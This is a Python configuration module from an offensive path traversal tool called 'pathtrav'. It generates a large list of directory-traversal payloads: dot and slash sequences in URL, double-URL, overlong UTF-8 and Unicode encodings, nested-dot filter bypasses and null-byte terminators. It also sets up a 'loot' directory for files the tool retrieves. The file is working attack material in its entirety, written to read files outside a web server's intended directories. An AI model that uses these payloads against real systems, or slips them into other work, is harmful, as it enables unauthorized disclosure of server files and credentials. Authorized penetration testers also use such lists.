#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
_____, ___
   '+ .;    
    , ;   
     .   
           
       .    
     .;.    
     .;  
      :  
      ,   
       

┌─[pathtrav]─[~]
└──╼ VainlyStrain
"""

import multiprocessing
import sys, os


def generatePayloads():
    dots = ['..', '. . ', '%2e%2e', '0x2e0x2e', '%252e%252e', '..;', '%c0%2e%c0%2e', '%e0%80%ae%e0%80%ae', '%c0%ae%c0%ae', '%25c0%25ae%25c0%25ae', 
        '%%32%65%%32%65', '%uff0e%uff0e', '%e0%ae%e0%ae', '%u002e%u002e', '%25%32%65%25%32%65', '%%c0%6e%c0%6e', '%c0%5e%c0%5e',
        '%c0%ee%c0%ee', '%c0%fe%c0%fe', '%f0%80%80%ae%f0%80%80%ae', '.%2e', '%2e.']
    slashes = ['/', '\\', '%2f', '0x2f', '%255c', '%252f', '%5c', '%c0%2f', '0x5c', '%c0%af', '%c1%9c', '%25c1%259c', '%%32%66', '%%35%63',
           '%u2215', '%u2216', '%uEFC8', '%uF025', '%e0%af', '%e0%80%af', '%c0%5c', '%c0%9v', '%c0%qf', '%c1%8s', '%c1%1c', '%c1%af',
           '%bg%qf', '%25c0%25af']
    nested = ['./', '.\\', '....//', '....\\\\', '...//', '...\\\\', '.....///', '.....\\\\\\', '..\\/', '../\\']

    plist = []
    for dot in list(set(dots)):
        for slash in list(set(slashes)):
            plist.append(dot+slash)

    plist = plist + nested
    return plist


payloadlist = generatePayloads()
special = ['.?/','?./','??/']
nullchars = ['%00', '%2500', '%25%30%30', '%u0000', '%c0%80', '%e0%80']
sdirs = ['']
commons = []

CLEAR_CMD = "cls" if sys.platform.lower().startswith("win") else "clear"
processes = multiprocessing.cpu_count()

if sys.platform.lower().startswith('win'):
    lootdir = os.path.dirname(os.path.realpath(__file__)) + "\\..\\loot\\"
    cachedir = os.path.dirname(os.path.realpath(__file__)) + "\\payload-cache\\"
else:
    lootdir = os.path.dirname(os.path.realpath(__file__)) + "/../loot/"
    cachedir = os.path.dirname(os.path.realpath(__file__)) + "/payload-cache/"

version = "1.5"
